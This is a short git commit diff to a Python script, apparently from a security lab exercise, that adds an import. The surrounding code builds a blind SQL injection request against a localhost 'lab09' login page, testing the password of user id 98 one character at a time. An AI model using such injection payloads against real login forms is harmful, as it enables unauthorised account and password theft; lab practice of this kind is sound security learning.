c0d12a006fc398526b26f5d77f44ffad576ca209
Ny4nc4t <>
2019-05-15 18:27:20 +0200

    qw

--- script.py
+++ script.py
@@ -1,5 +1,6 @@
 import subprocess
 import urllib
+import urllib.parse
 
 request = "http://localhost/lab09/login.php?u=\" OR id = 98 AND SUBSTRING(password,1,1) = '1' -- " 
 request = urllib.parse.quote(request)
